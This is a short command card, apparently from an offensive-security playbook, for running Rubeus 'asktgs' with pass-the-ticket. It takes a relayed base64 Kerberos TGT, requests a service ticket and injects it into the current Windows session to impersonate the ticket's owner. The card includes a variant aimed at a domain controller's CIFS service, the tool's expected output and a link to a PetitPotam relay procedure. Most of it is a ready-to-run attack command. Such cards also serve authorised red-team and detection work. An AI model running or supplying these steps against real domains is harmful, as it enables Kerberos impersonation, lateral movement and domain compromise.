---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
name: rubeus-ask-tgs-ptt
type: command
executor: cmd
data: '.\Rubeus.exe asktgs /ticket:$_TICKET_BASE64 /ptt'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Windows
tags:
  - kerberos
  - ptt
verified: true
validated: true
---

# rubeus-ask-tgs-ptt

## Command

```cmd
.\Rubeus.exe asktgs /ticket:$_TICKET_BASE64 /ptt
```

## Description

Uses Rubeus to request a TGS ticket from a provided base64-encoded TGT and pass-the-ticket it into the current Windows session for Kerberos impersonation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TICKET_BASE64 | Base64-encoded Kerberos TGT from relay | Yes |
| /ptt | Pass-the-ticket to inject into session | Built-in |

## Examples

### Basic Usage

```cmd
.\Rubeus.exe asktgs /ticket:VXNlcjpkb21haW4uY29tAA... /ptt
```

### With Specific Service

```cmd
.\Rubeus.exe asktgs /ticket:$_TICKET_BASE64 /service:cifs/dc.domain.com /ptt
```

## Expected Output

Ticket request and injection:

[*] Action: AskTGS

[*] Using the provided ticket: <base64>

[*] Requesting TGS ticket to SPN: cifs/dc.domain.com

[*] TGS ticket exported!

[*] Ticket successfully imported!

## Related

- [[procedures/MS-EFSRPC-Abuse-via-PetitPotam-and-Unconstrained-Delegation]]
- [[tools/Rubeus]]
